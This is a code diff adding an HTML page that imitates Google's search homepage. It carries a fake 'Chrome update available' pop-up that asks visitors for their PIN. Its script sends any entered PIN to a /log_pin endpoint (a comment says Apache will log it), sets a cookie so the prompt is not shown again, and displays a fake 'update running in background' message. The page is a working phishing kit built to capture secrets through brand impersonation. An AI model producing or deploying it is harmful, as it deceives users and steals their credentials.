@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google</title>
+  <style>
+    body {
+      font-family: 'Roboto', Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(135deg, #f8f8f8, #f1f1f1);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      color: #202124;
+      transition: background 0.3s ease, color 0.3s ease;
+    }
+
+    .container {
+      text-align: center;
+      padding: 20px;
+    }
+
+    h1 {
+      font-size: 2.5rem;
+      margin-bottom: 20px;
+      color: #202124;
+    }
+
+    .logo {
+      width: 250px;
+      max-width: 100%;
+      margin-bottom: 30px;
+    }
+
+    .search-box {
+      display: flex;
+      justify-content: center;
+      flex-direction: column;
+    }
+
+    input[type="text"] {
+      width: 90%;
+      max-width: 600px;
+      padding: 16px;
+      font-size: 18px;
+      border-radius: 30px;
+      border: 1px solid #dcdcdc;
+      outline: none;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+      transition: all 0.3s ease-in-out;
+      text-align: center;
+    }
+
+    input[type="text"]:focus {
+      border-color: #4285F4;
+      box-shadow: 0 2px 10px rgba(66, 133, 244, 0.3);
+    }
+
+    .buttons {
+      margin-top: 30px;
+      display: flex;
+      justify-content: center;
+      gap: 16px;
+    }
+
+    .buttons input {
+      padding: 14px 30px;
+      font-size: 16px;
+      border-radius: 25px;
+      border: none;
+      background-color: #f8f8f8;
+      color: #5f6368;
+      cursor: pointer;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      transition: background-color 0.3s ease, transform 0.2s ease;
+    }
+
+    .buttons input:hover {
+      background-color: #f1f1f1;
+      transform: scale(1.05);
+    }
+
+    .buttons input:active {
+      transform: scale(1);
+    }
+
+    .buttons input:focus {
+      outline: none;
+    }
+
+    /* Modal Popup for Update Available */
+    .update-modal {
+      display: none;
+      position: fixed;
+      z-index: 1;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.4);
+      padding-top: 60px;
+    }
+
+    .update-modal-content {
+      background-color: rgba(255, 255, 255, 0.8);
+      margin: 10% auto;
+      padding: 15px 20px;
+      border-radius: 10px;
+      width: 80%;
+      max-width: 400px;
+      text-align: center;
+      color: #202124;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+    }
+
+    .update-modal-header {
+      font-size: 1.5rem;
+      font-weight: bold;
+      margin-bottom: 15px;
+    }
+
+    .update-button {
+      padding: 12px 28px;
+      font-size: 16px;
+      border-radius: 25px;
+      border: none;
+      background-color: #4285F4;
+      color: white;
+      cursor: pointer;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      transition: background-color 0.3s ease, transform 0.2s ease;
+    }
+
+    .update-button:hover {
+      background-color: #357ae8;
+      transform: scale(1.05);
+    }
+
+    .update-button:active {
+      transform: scale(1);
+    }
+
+    .update-button:focus {
+      outline: none;
+    }
+
+    /* Modal Popup for PIN entry */
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 1;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.4);
+      padding-top: 60px;
+    }
+
+    .modal-content {
+      background-color: rgba(255, 255, 255, 0.8);
+      margin: 10% auto;
+      padding: 20px;
+      border-radius: 10px;
+      width: 80%;
+      max-width: 400px;
+      text-align: center;
+      color: #202124;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+    }
+
+    .modal-header {
+      font-size: 1.5rem;
+      font-weight: bold;
+      margin-bottom: 20px;
+    }
+
+    input[type="text"].pin-input {
+      width: 80%;
+      padding: 16px;
+      font-size: 18px;
+      margin-top: 10px;
+      border-radius: 30px;
+      border: 1px solid #dcdcdc;
+      outline: none;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+
+    input[type="text"].pin-input:focus {
+      border-color: #4285F4;
+      box-shadow: 0 2px 10px rgba(66, 133, 244, 0.3);
+    }
+
+    /* Updating background message */
+    .updating-background-message {
+      display: none;
+      position: fixed;
+      z-index: 9999;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      color: #4285F4;
+      font-size: 1.5rem;
+      font-weight: bold;
+      text-align: center;
+      opacity: 0;
+      transition: opacity 1s ease; /* Smooth fade-out */
+    }
+
+    /* Light and Dark Mode styles */
+    @media (prefers-color-scheme: dark) {
+      body {
+        background: linear-gradient(135deg, #121212, #1c1c1c);
+        color: #e8e8e8;
+      }
+
+      .buttons input {
+        background-color: #333;
+        color: #e8e8e8;
+      }
+
+      .buttons input:hover {
+        background-color: #444;
+      }
+
+      input[type="text"] {
+        background-color: #333;
+        border: 1px solid #555;
+        color: #e8e8e8;
+      }
+
+      input[type="text"]:focus {
+        border-color: #4285F4;
+        box-shadow: 0 2px 10px rgba(66, 133, 244, 0.3);
+      }
+
+      .modal-content,
+      .update-modal-content {
+        background-color: rgba(51, 51, 51, 0.8);
+        color: #e8e8e8;
+      }
+
+      .modal-header,
+      .update-modal-header {
+        color: #e8e8e8;
+      }
+
+      .updating-background-message {
+        color: #f1f1f1;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/512px-Google_2015_logo.svg.png" alt="Logo" class="logo">
+
+    <form action="https://www.google.com/search" method="get" class="search-box">
+      <input type="text" name="q" placeholder="Search Google" required>
+
+      <div class="buttons">
+        <input type="submit" value="Google Search">
+        <input type="submit" value="I'm Feeling Lucky" formaction="https://www.google.com/search?btnI=1">
+      </div>
+    </form>
+  </div>
+
+  <!-- Update Available Modal -->
+  <div id="updateModal" class="update-modal">
+    <div class="update-modal-content">
+      <h2 class="update-modal-header">
+        Chrome update available
+      </h2>
+      <button class="update-button" onclick="showPinModal()">Update</button>
+    </div>
+  </div>
+
+  <!-- Modal Popup for PIN entry -->
+  <div id="pinModal" class="modal">
+    <div class="modal-content">
+      <h2 class="modal-header">
+        For security, please enter your PIN to update
+      </h2>
+      <input type="text" id="pinInput" class="pin-input" placeholder="Enter PIN">
+    </div>
+  </div>
+
+  <!-- Updating background message -->
+  <div id="updatingBackgroundMessage" class="updating-background-message">
+    Update running in background
+  </div>
+
+  <script>
+    // Show Update Available modal only if PIN is not entered
+    window.onload = function() {
+      if (getCookie("pinEntered") !== "true") {
+        document.getElementById('updateModal').style.display = "block"; 
+      }
+    }
+
+    // Function to show PIN modal
+    function showPinModal() {
+      document.getElementById('updateModal').style.display = "none";  // Hide Update Available modal
+      document.getElementById('pinModal').style.display = "block";  // Show PIN modal
+    }
+
+    // Function to get a cookie by name
+    function getCookie(name) {
+      const value = `; ${document.cookie}`;
+      const parts = value.split(`; ${name}=`);
+      if (parts.length === 2) return parts.pop().split(';').shift();
+    }
+
+    // Set or delete cookie for pinEntered flag
+    function setCookie(name, value, days) {
+      const d = new Date();
+      d.setTime(d.getTime() + (days * 24 * 60 * 60 * 1000));
+      let expires = "expires=" + d.toUTCString();
+      document.cookie = name + "=" + value + ";" + expires + ";path=/";
+    }
+
+    // Get modal and elements
+    var modal = document.getElementById('pinModal');
+    var pinInput = document.getElementById('pinInput');
+    var updatingBackgroundMessage = document.getElementById('updatingBackgroundMessage');
+
+    // Handle Enter key to submit PIN input
+    pinInput.addEventListener('keydown', function (event) {
+      if (event.key === "Enter") {
+        var pin = pinInput.value;
+
+        if (pin) {
+          // Send the PIN number via a GET request (this will be logged by Apache)
+          var xhr = new XMLHttpRequest();
+          xhr.open('GET', '/log_pin?pin=' + encodeURIComponent(pin), true);
+          xhr.send();
+
+          // Set the cookie to indicate the PIN has been entered
+          setCookie("pinEntered", "true", 365); // Cookie will last for 1 year
+
+          // Close the modal after submitting
+          modal.style.display = "none";
+
+          // Delay showing the "Updating running in background" message by 1 second
+          setTimeout(function () {
+            // Show the "Updating in background" message
+            updatingBackgroundMessage.style.display = "block";
+            updatingBackgroundMessage.style.opacity = 1; // Make sure it's visible
+
+            // Fade out the message after 1 second
+            setTimeout(function () {
+              updatingBackgroundMessage.style.opacity = 0; // Start fading out
+              setTimeout(function () {
+                updatingBackgroundMessage.style.display = "none"; // After fade-out, hide the message
+              }, 1000); // Wait for the fade-out transition to complete
+            }, 1000); // Keep it visible for 1 second before starting fade-out
+          }, 1000); // 1 second delay before showing the message
+        } else {
+          alert("Please enter a PIN.");
+        }
+      }
+    });
+
+    // If the user clicks anywhere outside the modal, close it
+    window.onclick = function (event) {
+      if (event.target == modal) {
+        modal.style.display = "none";
+      }
+    };
+  </script>
+
+</body>
+</html>
